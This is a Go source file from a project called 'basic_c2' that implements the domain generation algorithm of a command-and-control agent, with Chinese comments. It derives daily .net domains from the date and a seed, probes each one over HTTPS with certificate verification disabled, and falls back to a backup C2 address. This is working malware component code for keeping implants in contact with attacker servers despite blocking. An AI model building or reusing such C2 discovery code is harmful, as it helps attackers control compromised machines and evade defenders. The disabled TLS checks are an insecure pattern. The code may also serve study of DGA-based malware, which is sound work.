package dga

import (
	"crypto/md5"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"net/http"
	"time"

	"basic_c2/internal/config"
)

// GenerateDomains 基于日期和种子生成 DGA 域名列表
func GenerateDomains(count int) []string {
	domains := make([]string, 0)
	dateStr := time.Now().Format("2006-01-02")
	fmt.Printf("[DGA] 计算基准日期: %s, 种子: %s\n", dateStr, config.DGASeed)
	
	for i := 0; i < count; i++ {
		raw := fmt.Sprintf("%s%s%d", dateStr, config.DGASeed, i)
		hasher := md5.New()
		hasher.Write([]byte(raw))
		hash := hex.EncodeToString(hasher.Sum(nil))
		baseDomain := fmt.Sprintf("https://%s.net", hash[0:12])
		domains = append(domains, baseDomain)
	}
	
	return domains
}

// TryConnect 探测域名是否可用（只检查连接性，不发送业务数据）
func TryConnect(client *http.Client, baseDomain string) bool {
	probeURL := baseDomain + "/ping"
	fmt.Printf("[DGA] 探测: %s ... ", probeURL)
	
	req, _ := http.NewRequest("HEAD", probeURL, nil)
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("失败 (网络不可达)")
		return false
	}
	defer resp.Body.Close()

	fmt.Printf("成功! (收到 HTTP %d)\n", resp.StatusCode)
	return true
}

// NegotiateC2 尝试所有 DGA 域名，返回第一个可用的域名
func NegotiateC2(timeout time.Duration) string {
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	client := &http.Client{Timeout: timeout, Transport: tr}

	fmt.Println("======== [Agent: DGA Negotiation] ========")
	
	candidateDomains := GenerateDomains(config.DGACount)
	
	for _, domain := range candidateDomains {
		if TryConnect(client, domain) {
			return domain
		}
	}

	// 如果所有 DGA 域名都失败，返回保底域名
	fmt.Println("[Fallback] 切换至保底域名...")
	return config.BackupC2URL
}
